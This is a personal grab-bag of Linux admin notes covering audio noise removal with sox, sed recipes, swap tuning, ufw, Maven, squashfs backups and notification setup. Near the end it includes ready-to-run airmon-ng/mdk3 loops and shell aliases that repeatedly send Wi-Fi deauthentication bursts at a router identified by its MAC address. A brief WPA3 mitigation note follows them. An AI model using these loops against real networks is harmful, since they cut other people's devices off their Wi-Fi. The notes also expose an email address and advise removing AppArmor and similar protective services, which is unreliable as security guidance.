# remove noise sound in recording
#  use my script /media/D/HOME/notes_files/removeNoise.sh

#!/bin/sh

# record by vokoscreen -> alsa  -> fames=4  -> must be avi  [dont use mkv the size of file will be very big]
# in /tmp you will find file.avi for vokoscreen . puause then copy it to your folder

# apt-get install sox lame
# best one is avi
# to run it by ./removeNoise in.avi out.mp4  0.25

# to run it by ./removeNoise in.mkv out.mp4  0.25
# to run it by ./removeNoise in.mp4 out.mp4  0.25


INPUT=$1
OUTPUT=$2
RATE=$3

echo "Extract video ..."
avconv -i "$INPUT" -an -vcodec copy tmpvid.mp4

echo "==============================="
echo "Extract audio ..."
echo "==============================="
avconv -i "$INPUT"  -vn  tmpaud.mp3
lame --decode tmpaud.mp3 tmpaud.wav

echo "==============================="
echo "Prepare Noise Sample ..."
echo "==============================="
avconv -i "$INPUT"  -vn -ss 00:00:00 -t 00:00:02 noiseaud.mp3
lame --decode noiseaud.mp3 noiseaud.wav

echo "==============================="
echo "Generate Noise Profile ..."
echo "==============================="
sox noiseaud.wav -n noiseprof noise.prof

echo "==============================="
echo "Generate Clean sound ..."
echo "==============================="
sox tmpaud.wav tmpaud-clean.wav noisered noise.prof "$RATE"

echo "==============================="
echo "file.MKV =>  merge  video and audio ..."
echo "==============================="
avconv -i tmpaud-clean.wav -i tmpvid.mp4 -acodec copy -vcodec copy outtemp.mkv
or
ffmpeg -i video.mp4 -i audio.wav -c:v copy -c:a aac output.mp4

echo "==============================="
echo "convert mkv to mp4 to reduce size  ..."
echo "==============================="
# avconv -i outtemp.mkv  -c:v copy  -c:a libmp3lame -q:a 2 "$OUTPUT"

#  very slow will reduce mp4  but  cpu high temperature

sed command

http://arabteam2000-forum.com/index.php/topic/279798-%D8%A7%D9%84%D9%85%D9%8F%D8%AD%D8%B1%D8%B1-%D8%A7%D9%84%D8%AA%D8%AF%D9%81%D9%82%D9%8A-sed/

sed OPTIONS... [SCRIPT] [INPUTFILE...]
--
echo "one, two, four, one, two, four" | sed 's/four/three/'
one, two, three, one, two, four
--
echo "one, two, four, one, two, four" | sed 's/four/three/g'
one, two, three, one, two, three
--
echo "Total price : 52 Dollar or 10400 s.p" | sed 's/\([0-9]\+\)/<&>/g'
Total price : <52> Dollar or <10400> s.p

# replace orignal by new
sed -i 's/original/new/g' file.txt
Explanation:
-i = in-place (i.e. save back to the original file)
The command string:
s = the substitute command
original = a regular expression describing the word to replace (or just the word itself)
new = the text to replace it with
g = global (i.e. replace all and not just the first occurrence)

# replace special char by space
sed 's/[^[:alpha:]\t]/ /g'
s = the substitute command
[^[:alpha:] = not alphabatic ,  a regular expression describing the word to replace (or just the word itself)
/ /  = replaced by space the text to replace it with
g = global (i.e. replace all and not just the first occurrence)

sed -i  's/[^[:alpha:]\t]/ /g' oneFile.java
or by emacs by
M-x rx  [^[:alpha:]]  replaced by space

# replace space by newline
sed -e 's/\s\+/\n/g' old > new

# sort lines
sort ok33.txt -o ok44.txt

find .  -iname  '*.java'  -type f  -exec cat  {} >> "/home/allJavaStream.txt" \;
sed -i  's/[^[:alpha:]\t]/ /g' oneFile.java
sed -e 's/\s\+/\n/g' old > new
sort ok33.txt -o ok44.txt
# delete duplicate
uniq filename, must be sorted like this command  ( sort filename | uniq )
or
M-x dd

find . -not  -iname  '*.java'  -type f  -exec cat  {} >> "/root/Desktop/webStream.txt" \;
sed -i  's/[^[:alpha:]\t]/ /g' oneFile.java
sed -e 's/\s\+/\n/g' old > new
sort ok33.txt -o ok44.txt

uniq filename, must be sorted like this command  ( sort filename | uniq )
or
M-x dd

# second way to stop fsprotect
If you ever need to boot "unfrozen", you'll have to hold Shift key at bootup to access the GRUB menu
.. highlight the top option, and hit the E key ..
then manually remove the options fsprotect=auto
then hit Ctrl+X to continue booting.

;;; for root system and sub  means / and all sub folders
;;; warrning => dont use 30% percent, use 5G , if you use 30% means /temp and / will be 1.5 GB

modify this line
# GRUB_CMDLINE_LINUX_DEFAULT="quiet"

then  then then  write command
update-grub

Q:how calculate fsprotect size = 5G ??
ram+swap = 10G (command free -h), then half of it = 5G =>> fsprotect=5G
note :- ram+swap =10G then  ==> fsprotect=5G
note :- 5G from ram+swap (free -mh)
note :- auto ==> 50% from ram+swap

# touchpad mouse
# synclient synaptics
# apt-get install xserver-xorg-input-synaptics then reboot => then you will find synclient,which means remap mouse and touchpad, read links below
# from gnome-shell stop right click by  gsettings set   org.gnome.desktop.peripherals.touchpad click-method 'none'
# from gnome-shell stop vertical-scroll and all touchpad key but but but but keep left-click (tap-to-click) keep it working
# touchpad one finger => left click
synclient tapbutton1=1

# toucpad  two fingers => right click
synclient tapbutton2=3

# vertical scroll
synclient VertEdgeScroll=1

# stop vertical two finers
synclient VertTwoFingerScroll=0

# old
# [finally working]
# my mouse, touchpad
# apt-get install xserver-xorg-input-synaptics then synclient will work after reboot
# put this text in file /usr/share/X11/xorg.conf.d/70-synaptics.conf  then reboot
# Option "tapbutton1" "1"  means  one touch finger = left click
# Option "tapbutton2" "3"  means  two touch finger = right click
# Option "VertEdgeScroll" "1"  means  vertical horizontal scroll by edge side = on true
# Option "VertTwoFingerScroll" "0" means  vertical horizontal scroll by two fingers  = off
#
Section "InputClass"
        Identifier "ahmad touchpad "
        MatchDriver "synaptics"
        MatchIsTouchpad "on"
        Option "tapbutton1" "1"
        Option "tapbutton2" "3"
        Option "VertEdgeScroll" "1"
        Option "VertTwoFingerScroll" "0"
EndSection

[stop it  ]  speech-dispatcher : read the text to sound, like screen reader,  speech-dispatcher  is  a  server process that is responsible for transforming requests for text-to-speech output into actual speech  hearable        in the speakers

##### swap swap swap ##########
##### swap swap swap ##########
##### swap swap swap ##########
https://haydenjames.io/linux-performance-almost-always-add-swap-space/
# decrese the swappiness from 60 to 20 ==>(60 means that start using swap when the ram fulled by 40%)
  show the swappiness value by command
  cat /proc/sys/vm/swappiness  ==> must be 20 not 60
  
  to modify  swappiness from 60 to 20 (60 means that start using swap when the ram fulled by 40%)
  1- emacs /etc/sysctl.d/99-sysctl.conf
     or
     emacs /etc/sysctl.conf
  2- add this value
      # Setting it to 0 means to never use swap when there is still RAM left 
      vm.swappiness=0 
  3- reboot 
     echo "cat /proc/sys/vm/swappiness ==> must be 0 "
     free -h to view the swap

# ssd(sda) and hd(sdb) have two swap, so stop the swap in hd(sdb7), because it is very slow
# to check it by free -h must be 18GB
swapoff  -v /dev/sdb7
swapoff  -v /dev/sda7
or or or
(the best solution)
/etc/fstab then remove the swap of hdd (to block partitions )
lsblk -fs ==> to view the uuid

# in .bashrc  mypackagesRemover
 # remove these packages from my system kali linux 
 # systemctl list-units --type=service  ;; list all services
 mypackagesRemover(){
     sudo aptitude  remove   apparmor   clipit   cron   anacron   accountsservice   avahi-daemon   brltty   modemmanager  fwupd  postfix   thermald  hddtemp  timeshift  wondershaper   clipit  geoclue-2.0
     echo "systemctl list-units --type=service     for  list all services"
     echo "sudo fstrim -av   to clean ssd drive"
 }

sudo apt-get remove  geoclue-2.0  ;; map location by geography 
sudo apt-get remove  clipit     ;; clip board 
sudo apt-get remove  apparmor  ;; 
sudo apt-get remove  clipit    ;; divide memory, make pc very slow
sudo apt-get remove  cron      ;; run at the time scheduler
sudo apt-get remove  anacron
sudo apt-get remove  accountsservice ;;AccountsService is a D-Bus service for accessing the list of user accounts and information attached to those accounts. 
sudo apt-get remove  avahi-daemon  ;; find scanner and printers in network
sudo apt-get remove  brltty   ;; blind person 
sudo apt-get remove  modemmanager
sudo apt-get remove fwupd      ;; fwupd is a simple daemon allowing you to update some devices firmware, including UEFI for several machines. 
sudo apt-get remove postfix    ;; Postfix is a free and open-source mail transfer agent (
sudo aptitude remove thermald  ;;thermald  is  a  Linux  daemon  used  to prevent the overheating of platforms. This daemon  monitors temperature and applies compensation using available cooling methods
sudo aptitude  remove hddtemp   ;; hddtemp is a small utility (with daemon) that gives the hard-drive temperature via S.M.A.R.T. (for drives supporting this feature).
sudo apt-get remove timeshift   ;; backup service
sudo apt-get   remove wondershaper   ;; controlling bandwidth on a Linux server
sudo systemctl disable tor
sudo systemctl disable anacron

[change date and time in lxde]

1- set the time in bios after start the computer press F2 bios, tab to change date and time 
   sudo timedatectl set-timezone 'Asia/Amman'
2- start---> preferences---> change date and time manually.
   sudo systemctl stop    ntp.service
   sudo systemctl disable  ntp.service
   sudo apt-get remove ntp ;; server for give you time and  date
5- sudo systemctl stop    systemd-timedated.service
6- sudo systemctl disable  systemd-timedated.service

   # set the time from the local by commaand 
   sudo timedatectl set-local-rtc 1
7- sudo timedatectl  ===>>> the out put 
               Local time: Fri 2020-10-16 03:57:12 EEST  <<---|
           Universal time: Fri 2020-10-16 00:57:12 UTC        | the same by command  timedatectl set-local-rtc 1
                 RTC time: Fri 2020-10-16 03:57:12       <<---|
                Time zone: Asia/Amman (EEST, +0300)    
System clock synchronized: no   <<<=====
              NTP service: inactive <<<=====                 
          RTC in local TZ: yes <<<==== timedatectl set-local-rtc 1

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
kern.log file message means
Oct  6 10:13:09 zinko kernel: [ 3993.096155] perf: interrupt took too long (3139 > 3133), lowering kernel.perf_event_max_sample_rate to 63500
means ===>
    Perf is a Linux Kernel performance monitor.
    Perf uses Non-Maskable Interrupts. This basically means Perf can tell the cpu “Pauze whatever you’re doing now and let me do something”. This allows perf to have a “watchdog” functionality where it can monitor even the most critical processes and interrupts.
With great power comes great responsibility. Perf can hang your computer by constantly pauzing
everything. To make sure this won’t happen, the kernel itself monitors perf.
When it decides perf is pauzing too long, it tells perf to do a little bit less.
That’s basically what that dmesg line means. The kernel told perf to do a little bit less.
Does it have anything to do with the Wifi problem? Probably not… But at least I learned something:
The kernel watches the watchmen…

# must stop all expired options  with dash - , and i have to put timeout 9999 second, means 7 days
xkbset exp -bell -sticky -twokey -latchlock -accessx -feedback -stickybeep -led  9999

# set sticky only and disable the others with dash -, and keyboard rate
# xkbset                 sticky  -twokey -latchlock -feedback -led -stickybeep -bell
xkbset  r rate 180 15  sticky  -twokey -latchlock -feedback -led -stickybeep -bell



mySticky.sh is =>

# sticky => enable sticky, -twokey  disable stikcy if two key pressed togather, -latchlock disable pressing control twice to be always pressed (wow)
# -latchlock disable  a modifier pressed twice will be locked:
#  apt-get install xkbset

# must stop all expired options  with dash - , and i have to put timeout 9999 second, means 7 days
xkbset exp -bell -sticky -twokey -latchlock -accessx -feedback -stickybeep -led  9999
# set sticky only and disable the others with dash -, and keyboard rate
# xkbset                 sticky  -twokey -latchlock -feedback -led -stickybeep -bell
# 180 for writing, 15 for moving
xkbset  r rate 190 11  sticky  -twokey -latchlock -feedback -led -stickybeep -bell

how to fix ntfs by linux and can rwx files in ntfs by linux ?
;; best way is using gparted then umount then check to fix ntfs ext4 fat32
1- sudo ntfsfix /dev/sda6
2- disable  (fast boot) of windows from power settings

apt-get install ntfs-3g
sudo ntfsfix -b -d /dev/sda6  # must reboot after command
gparted  to view the sda6  # or blkid

#  disable fast-boot (fast startup)
 1. Type Control Panel in the search box.
Click Control Panel.
Click Power Options.
Click Choose what the power buttons do.
Click Change settings that are currently unavailable.
Scroll down to Shutdown settings and uncheck Turn on fast startup.
Click Save changes.
disable fast-boot (fast startup)
in windows --> Control Panel  ->  Power Options

apt-get install ufw
sudo ufw disable
sudo ufw enable

ufw status
ufw status verbose

sudo ufw default deny incoming
sudo ufw default allow outgoing

# allow incomming port 22
sudo ufw allow 22/tcp
sudo ufw allow ftp

# deny incomming port 22
sudo ufw allow 22/tcp
sudo ufw allow ftp

# This actully will block incoming SMTP 25
sudo ufw deny 25

# This actully will block outgoing SMTP 25
sudo ufw deny out 25



# reset every thing as default
sudo ufw reset



# my share, allow then deny after copy every thing
ufw status verbose
sudo ufw allow 8080
# after copy close the incomming port
sudo ufw deny  8080

;; maven in 5 minutes


;; how to generate mvn site in target/site by two steps
1- add this to pom.xml
			<plugin>
				<groupId>org.apache.maven.plugins</groupId>
				<artifactId>maven-site-plugin</artifactId>
				<version>3.7.1</version>
			</plugin>
			<plugin>
				<groupId>org.apache.maven.plugins</groupId>
				<artifactId>maven-project-info-reports-plugin</artifactId>
				<version>3.0.0</version>
			</plugin>
2- then use the command
    mvn site



;; mvn
Q:- update repository after adding dependency to POM.xml
mvn install (or mvn package)


;; mvn
;; convert pom.xml (maven) to ===>>> .classpath in eclipse , and generate .project file also
mvn eclipse:eclipse -Dwtpversion=2.0       ;; for web project
mvn eclipse:eclipse                        ;; for desktop project and web also
mvn eclipse:eclipse -DdownloadSources=true ;; download source code with jars
https://www.mkyong.com/struts2/struts-2-hello-world-example/
https://docs.geotools.org/latest/userguide/build/maven/eclipse.html
https://www.mkyong.com/maven/no-more-mvn-eclipseeclipse-whats-next/ (plugin mvn is retired, not mvn command)


;; mvn
# apache tomcat ignore (classpth) environment varialbe
WEB-INF/lib        ==>> only visible to the web application that loads them
$CATALINA_HOME/lib ==>> These resources are visible to all applications and to Tomcat.
;; so the fast solution is to copy maven dependencies to WebContent/WEB-INF/lib
;; How to use maven just to copy dependencies
mvn dependency:copy-dependencies -DoutputDirectory=WebContent/WEB-INF/lib
mvn dependency:copy-dependencies -DoverWriteReleases=false -DoverWriteSnapshots=false  -DoverWriteIfNewer=true   -DoutputDirectory=WebContent/WEB-INF/lib
// i can convert from pom.xml to mvn command line by adding -D properties as above
// above commands are same because overWriteReleases=false(default), so no need to put it here.
// or can add it to the pom.xml by :-
			<plugin>
				<groupId>org.apache.maven.plugins</groupId>
				<artifactId>maven-dependency-plugin</artifactId>
				<version>3.1.1</version>
				<executions>
					<execution>
						<id>copy-dependencies</id>
						<phase>package</phase>
						<goals>
							<goal>copy-dependencies</goal>
						</goals>
						<configuration>
							<outputDirectory>WebContent/WEB-INF/lib</outputDirectory>
						 	<overWriteReleases>false</overWriteReleases>
							<overWriteSnapshots>false</overWriteSnapshots>
							<overWriteIfNewer>true</overWriteIfNewer>
						</configuration>
					</execution>
				</executions>
			</plugin>



mvn -q  ===> view only error level

Q:-where  maven jars downloaded (repository)?
~/.m2/
Q;- how to create project by maven
mvn archetype:generate

;; convert pom.xml (maven) to ===>>> .classpath and .project in eclipse
mvn eclipse:eclipse -Dwtpversion=2.0       ;; for web project
mvn eclipse:eclipse                        ;; for desktop project and web also
mvn eclipse:eclipse -DdownloadSources=true ;; download source code with jars

Q:-  add all jars of dependencies in target/myjar.jar  by this command mvn
mvn assembly:assembly -DdescriptorId=jar-with-dependencies
or by plugin build tag
to run it use java -jar my.jar MainClass or write Main-Class: package/MainClass in Manifest

Q;- run maven with debug -X
   mvn -X clean package

;; how to create project by maven using command line
;; https://maven.apache.org/guides/getting-started/maven-in-five-minutes.html

;; list all maven already archive then choose one of them
   mvn archetype:generate
;; or fill it by yourself
   mvn archetype:generate -DgroupId=com.mycompany.app -DartifactId=my-app -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=false
;; then see the pom.xml
   cd my-app
;; view all files as tree by command  find .
;; then build project by command , to generate target folder
   mvn package ;; not mvn only
;; run project by command, no diff by using dot or /
  java -cp target/my-app-1.0-SNAPSHOT.jar com.mycompany.app.App
  java -cp target/my-app-1.0-SNAPSHOT.jar com/mycompany/app/App
  java -cp target/my-app-1.0-SNAPSHOT.jar com.mycompany/app/App
;; clean: cleans up artifacts created by prior builds
    mvn clean dependency:copy-dependencies package

;; site: generates site documentation for this project
    mvn site

;; build src/pom.xml and generate folder target
   M-x jdee-maven-build      => mvn package
   M-x jdee-maven-unit-test  => mvn test


;; Maven Phases
mvn  package		: take the compiled code and package it in its distributable format, such as a JAR.
mvn  test		: test the compiled source code using a suitable unit testing framework. These tests should not require the code be packaged or deployed
mvn  clean		: cleans up artifacts created by prior builds
mvn  site		: generates site documentation for this project
mvn  clean		: cleans up artifacts created by prior builds
mvn  validate		: validate the project is correct and all necessary information is available
mvn  compile		: compile the source code of the project
mvn  integration-test	: process and deploy the package if necessary into an environment where integration tests can be run
mvn  verify		: run any checks to verify the package is valid and meets quality criteria
mvn  install		: install the package into the local repository, for use as a dependency in other projects locally
mvn  deploy		: done in an integration or release environment, copies the final package to the remote repository for sharing with other developers and projects.


Q: how can  change all default directories of maven

      <build>
      <directory>target</directory>
      <outputDirectory>target/classes</outputDirectory>
      <finalName>${artifactId}-${version}</finalName>
      <testOutputDirectory>target/test-classes</testOutputDirectory>
      <sourceDirectory>src/main/java</sourceDirectory>
      <scriptSourceDirectory>src/main/scripts</scriptSourceDirectory>
      <testSourceDirectory>src/test/java</testSourceDirectory>
      <resources>
      <resource>
      <directory>src/main/resources</directory>
      </resource>
      </resources>
      <testResources>
      <testResource>
      <directory>src/test/resources</directory>
      </testResource>
      </testResources>
      </build>

Q;- generate one jar and put Manifest main class

  <build>
    <!-- add all jars of dependencies in target/myjar.jar  by this command mvn -->
    <!-- mvn assembly:assembly -DdescriptorId=jar-with-dependencies -->
    <!-- or by plugin build tag as above  -->
    <!-- to run it use java -jar my.jar MainClass or write Main-Class: package/MainClass in Manifest -->
    <plugins>
      <!-- any other plugins -->
      <plugin>
        <artifactId>maven-assembly-plugin</artifactId>
        <!-- <artifactId>maven-shade-plugin</artifactId> -->
        <executions>
          <execution>
            <phase>package</phase>
            <goals>
              <!-- <goal>shade</goal> -->
              <goal>single</goal>
            </goals>
          </execution>
        </executions>
        <configuration>
	  <!-- add  all dependencies in one jar file  -->
          <descriptorRefs>
            <descriptorRef>jar-with-dependencies</descriptorRef>
          </descriptorRefs>
	  <!-- Manifest main class -->
	  <archive>
	    <manifest>
              <mainClass>mySpring.UserDao</mainClass>
	    </manifest>
	  </archive>
        </configuration>
      </plugin>
    </plugins>

    <!-- change all default directories  -->
    <!-- change all default directories  -->
    <directory>target</directory>
    <outputDirectory>target/classes</outputDirectory>
    <finalName>${artifactId}-${version}</finalName>
    <testOutputDirectory>target/test-classes</testOutputDirectory>
    <!-- src/main/java  -->
    <sourceDirectory>src/mySpring</sourceDirectory>
    <scriptSourceDirectory>src/main/scripts</scriptSourceDirectory>
    <testSourceDirectory>src/test/java</testSourceDirectory>
    <!-- src/main/resources for xml files  change it to src/resources  -->
    <resources>
      <resource>
	<directory>src/resources</directory>
      </resource>
    </resources>
    <testResources>
      <testResource>
        <directory>src/test/resources</directory>
      </testResource>
    </testResources>
  </build>

# apache tomcat ignore (classpth) environment varialbe
WEB-INF/lib        ==>> only visible to the web application that loads them
$CATALINA_HOME/lib ==>> These resources are visible to all applications and to Tomcat.
;; so the fast solution is to copy maven dependencies to WebContent/WEB-INF/lib
;; How to use maven just to copy dependencies
mvn dependency:copy-dependencies -DoutputDirectory=WebContent/WEB-INF/lib
mvn dependency:copy-dependencies -DoutputDirectory=WebContent/WEB-INF/lib
mvn dependency:copy-dependencies -DoutputDirectory=WebContent/WEB-INF/lib
source :- http://www.jcgonzalez.com/maven-just-copy-dependencies

;; backup home as iso
# backup my home by this way
1- fix errors in home
  umount /home ; fsck /dev/sda6 -y ; mount /home

# make iso files from folder, then open iso files by mount,
2-to work with long folder name with underscore
   ;; use this
   genisoimage -f -J -joliet-long -r -allow-lowercase -allow-multidot -o /media/root/D/home_backup/myHome.iso  /home/
3- mkdir home_mount_tmp
4- mount -o loop myhome.iso home_mount_tmp

# to edit iso file
apt-get install isomaster

[dont do this ]
dd if=/dev/sda6   of=/media/root/D/home_backup/home01_2018_11_20.iso  bs=100M

;; to open iso file
mkdir home_mount_tmp
mount -o loop home01_2018_11_20.iso  home_mount_tmp
umount home_mount_tmp


;; i change home backup to mksquashfs better and faster than iso
# always must clean partition before mksquashfs

umount /home ; fsck /dev/sda6 -y ; mount /home
make  squash ===>  mksquashfs folder  file.fs   -b 1M   -comp xz
mount squash ===>  mount -t squashfs file.fs temp -o loop

# list all files
unsquashfs file.sq -l

# how to make new distro from my linux
use linux live kit for all distro
https://github.com/Tomas-M/linux-live
0- apt-get install aufs-tools squashfs-tools
1- /media/root/D/myDistro/linux-live-master.zip extract it  in   /tmp

2- edit  ./config, add /lib32 folder and remove /home  folder
    MKMOD="bin etc lib32 lib lib64 opt root sbin srv usr var"
3- edit  ./config  change /tmp to /media/root/D to output the 01-core.bs (iso file)
    LIVEKITDATA=/media/root/D/backup_partitions/myDistro/$LIVEKITNAME-data-$$

4- in /tmp run ./build.sh
5- copy /media/root/D/linux/ directory to your USB drive.
6- run  /linux/boot/bootinst.sh  on your USB drive.
7- finish


[dont do this ]
# to restore file .bs or .iso to hard disk
# .bs is like .iso
1- dd  if=/01-core.bs    of=/dev/sdb2  bs=4M
2- then boot-repair to fix boot


;;  to open .bs (Squashfs filesystem) file
mkdir tmpx
mount  01-core.bs  tmpx
umount tmpx
or or or
note : .bs file is 01-core.sb: Squashfs filesystem
# how to edit .bs
https://unix.stackexchange.com/questions/80305/mounting-a-squashfs-filesystem-in-read-write/80312
;; to extract .bs file then edit it
unsquashfs 01-core.sb
;; to build .bs file
# always must clean partition before mksquashfs
mksquashfs squashfs-root filesystem.squashfs -b 1024k -comp xz -keep-as-directory

# change /home to /dev/sdb2 as home
https://www.tecmint.com/move-home-directory-to-new-partition-disk-in-linux/
1- rm -rf /home
2- mkdir /home
3- mount /dev/sdb2 /home

4- blkid /dev/sdb1
/dev/sdb1: UUID="e087e709-20f9-42a4-a4dc-d74544c490a6" TYPE="ext4" PARTLABEL="primary" PARTUUID="52d77e5c-0b20-4a68-ada4-881851b2ca99"

5-open /etc/fstab file add following line.
UUID=e087e709-20f9-42a4-a4dc-d74544c490a6   /home   ext4   defaults   0   2

6-reboot

1 select MBR
x select expert
z delete gpt
y delete gpt confirm
n dont delete mbr

then fix boot by repair-boot distro hahahahiiiiiiiiiiiiiiiiii

Press 'x' and enter to reach the eXpert mode

Q:-  how to add files to squashfs files, aufs instead of unionfs ,
 always mksquashfs will adding to ro.fs, it is will not delete ro.fs then create new ro.fs
add to squash with duplicate(no override)  ===>  mksquashfs folder  file.fs

Q:- how to  mount many folders in one folder for read or write?
A:- using  mount  seperated dir  by :
# group folder1:folder2:folder3  in folder3
# mount -t aufs  -o dirs=folder1=rw:folder2=rw:folder3=rw  aufs   folder3
# mount -t aufs  -o dirs=folder1=ro:folder2=ro:folder3=rw  aufs   folder3
umount folder3

# clonezilla make /dev/sad1 + /dev/sda5 backup by :-
# (from sda1+sda5 to D:(sda3))
1- dev-image
2- local-device
3- enter the Ctrl-c
4- sda3(D:) home-part(means the  backup location)
5- D:/backup-partitions, put the name of new image
6- Expert
7- save parts
8- select sda1 sda5
9- q2 (default)
10-  -c -j2 (default)
11- z0 (no compress, faster)
12- 1000000 MB (max)
13- fsck -y
14- yes,check the saved images

# final mdk3
airmon-ng start wlan1
airodump-ng wlan1mon
while :; do   echo "sleep 5 minutes..." ;  sleep 300 ;echo "cut 1 minute..."; timeout 60s  mdk3 wlan1mon d -b /home/this.txt -c  $( iwlist wlan0 scan | awk  '/Address: B8:C1:A2:5B:36:34/{getline; print}' | awk -F 'Channel:' '{print $2  }' )   ;   iwlist wlan0 scan | awk '/Address: B8:C1:A2:5B:36:34/{getline; print}' ; done
airmon-ng stop wlan1mon



# Start COMMAND, and kill it if still running after 5 seconds
timeout 7s command

# infinity loop
while :; do  echo 'Hit CTRL+C'; sleep 1; done
while :; do  timeout 30s  mdk3 wlan1mon d -b this.txt -c 13     ; sleep 300 ; done

# to see router channel  if 13 or not
iwlist wlan0 scan


# get all routers info
iwlist wlan0 scan

# get line after router mac address B8:C1:A2:5B:36:34 must be 13
iwlist wlan0 scan | awk   '/Address: B8:C1:A2:5B:36:34/{getline; print}'

# get line after word blah
awk '/blah/{getline; print}'

# mdk3 then sleep then  view channel
while :; do  timeout 30s  mdk3 wlan1mon d -b this.txt -c 13     ; sleep 200 ;   iwlist wlan0 scan | awk '/Address: B8:C1:A2:5B:36:34/{getline; print}'  ;done



# mdk3 then sleep then  print channel
while :; do  timeout 30s  mdk3 wlan1mon d -b this.txt -c 13     ; sleep 300 ;   iwlist wlan0 scan | awk '/Address: B8:C1:A2:5B:36:34/{getline; print}'  ;done


# print channel number  13
iwlist wlan0 scan        | awk   '/Address: B8:C1:A2:5B:36:34/{getline; print}'  | awk -F 'Channel:' '{print $2  }'


air_usb_start

# infinity loop, cut 20s then sleep 5 minute
while :; do  timeout 20s  mdk3 wlan1mon d -b this.txt -c 13     ; sleep 300 ; done

air_start(){
airmon-ng check kill
airmon-ng start wlan0
airodump-ng wlan0mon
}

air_stop(){
airmon-ng stop wlan0mon
service network-manager restart
}

alias air_start='air_start'
alias air_stop='air_stop'


air_usb_start(){
airmon-ng check kill
airmon-ng start wlan1
service network-manager restart
airodump-ng wlan1mon
}

air_usb_mdk(){
airmon-ng check kill
airmon-ng start wlan1
service network-manager restart

while :; do
echo "sleep 1 minutes..." ;
sleep 60 ;
echo "cut 5 minute..." ;
timeout 300s  mdk3 wlan1mon d -b /home/this.txt -c  $( iwlist wlan0 scan | awk  '/Address: B8:C1:A2:5B:36:34/{getline; print}' | awk -F 'Channel:' '{print $2  }' )    ;
done

}


air_usb_stop(){
airmon-ng stop wlan1mon
service network-manager restart
}

alias air_usb_start='air_usb_start'
alias air_usb_mdk='air_usb_mdk'
alias air_usb_stop='air_usb_stop'

;; wow radio, choose channel form alist
 (defun radio()
   "Prompt user to choice from a radio list."
   (interactive)
   (let ((channels '(
                     "http://184.173.185.71:9958   husary"
		     "http://104.238.193.114:7048  hayatFM"
		     "http://69.12.70.159:8000     songs"
		     )))
    (emms-play-url   (ido-completing-read "radio:"  channels))
))

# search jar,zip files by zipgrep
# zipgrep search inside *.zip or *.jar but cant visit file
{} the matching file
-execdir run command in the same file dir
-exec    run command here
apt-get install xz-utils - XZ-format compression utilities; for zgrep
find . -iname '*.zip'  -exec zipgrep  -nHi  -e "exit" {} +
find . -iname '*.jar'  -exec zipgrep  -nHi  -e "exit" {} +
find . -iname '*.pdf'  -exec pdfgrep  -nHi  -e "exit" {} +
find . -iname '*.pdf'  -exec pdfgrep  -nHi  -e "emacs" {} +
use it also inside dired M-x fg

# convert all jar to java classes
in dired ==> !unzip
find . -iname '*.class' -execdir jad   {} \;
# replace .jad to .java
find . -iname '*.class' -execdir jad -s java  {} +

instead use  jadx  or jadx-gui


;; merge jars into one jar
 mkdir tmp
 cd tmp
 unzip -ou  ../aa1.jar     ;; -ou o->override u->update
 unzip      ../aa2.jar
 unzip      ../aa3.jar
 cd ..
 jar -cvf combined.jar -C tmp .

# youtube-dl error downloading video
ERROR: Watch this video on YouTube. Playback on other websites has been disabled by the video owner.
the solution is :- youtube-dl -u ahmad.ali.omar.quran@gmail.com  https://www.youtube.com/watch
or use cookies instead of user/password
firefox ==>  extension ==> export cookies ==> cookies.txt
Ax youtube-dl --cookies cookies.txt https://www.youtube.com


1- cat ~/.netrc
machine youtube
login ahmad.ali.omar.quran@gmail.com
password mypassword

2- chmod 600 ~.netrc
3- youtube-dl -f 18  -n -c -v  https://www.youtube.com/watch

second solutions is  :- or or or

youtube-dl -u ahmad.ali.omar.quran@gmail.com  https://www.youtube.com/watch
Enter Password:

or or or
youtube-dl -u ahmad.ali.omar.quran@gmail.com  -p password  https://www.youtube.com/watch
youtube-dl -u Ahmed@gmail.com  -p password  https://www.youtube.com
or use cookies instead of user/password
firefox ==>  extension ==> export cookies ==> cookies.txt

    Click Run to launch it and then click the Lubuntu Menu/Preferences/Power Manager again to open the Xfce Power Manager window.
    Click on "Extended" in the screen menu and remove the check from "Lock screen when ..." and click Close.

# solve lxde battery low shutdown problem
https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=854643
1- sudo apt-get install libnotify-bin notification-daemon
2- add the following line to $HOME/.config/lxsession/LXDE/autostart
@/usr/lib/notification-daemon/notification-daemon
logout and get back in for the notification-daemon to start.
3- sudo apt-get install notify-osd

preferences -->  desktop-session-settings  --> gnome-disk-utitlity notifications must be checked,because it is for notifcation daemon
/etc/xdg/autostart/org.gnome.SettingsDaemon.DiskUtilityNotify.desktop

# check the command, must be work directly
root@zink:~# /usr/lib/notification-daemon/notification-daemon
then
root@zink:~# notify-send "Battery low" --icon=battery-caution



# notify the date, keep notify  10  second
notify-send -t 10000 "date" "$(date)"


# Remind yourself every 15 minutes (repeated reminders)
watch -n 900 "notify-send -t 10000 'Look away. Rest your eyes'"


# shutdown after 60 second after this notification
# -t => display for 60 second
notify-send -t 60000 "battery low, shutdown after 60 second" ; sleep 60 ; init 0

# start /usr/lib/notification-daemon/notification-daemon as systemd
https://askubuntu.com/questions/919054/how-do-i-run-a-single-command-at-startup-using-systemd

Your myNotificationDaemon.service file should look like this:
=================================
[Unit]
Description=Spark service

[Service]
ExecStart=/usr/lib/notification-daemon/notification-daemon

[Install]
WantedBy=multi-user.target
=================================
Now do a few more steps to enable and use the .service file:

1-   Place it in /etc/systemd/system folder with say a name of myNotificationDaemon.service
2-   Make that your script executable with:
     chmod u+x /usr/lib/notification-daemon/notification-daemon
3-   Start it:
     sudo systemctl start myNotificationDaemon.service
4-   Enable it to run at boot:
     sudo systemctl enable myNotificationDaemon.service
5-   Stop it:
     sudo systemctl stop myNotificationDaemon.service

# lsof command
lists the open files associated with your application. On some Linux machine

# you can see that httpd (Apache) listens on port 80
lsof -i tcp:80

# List programs which have  connections
lsof -i -P
lsof -i -P -n

# list opend files by java command
lsof -c java

# List opened files by a PID
lsof -p 1585

# stop mdk3 =>  Protected Management Frames & WPA3
While these attacks can be scary depending on what is being targeted like a home security camera,
these risks can be mitigated by using Ethernet wherever possible and upgrading the
WPA3 when devices supporting it becomes available. One of the core differences between
WPA2 and WPA3 is that WPA3 doesn't allow these kinds of attacks by preventing the authentication
or disassociation packets from being forged in the first place.

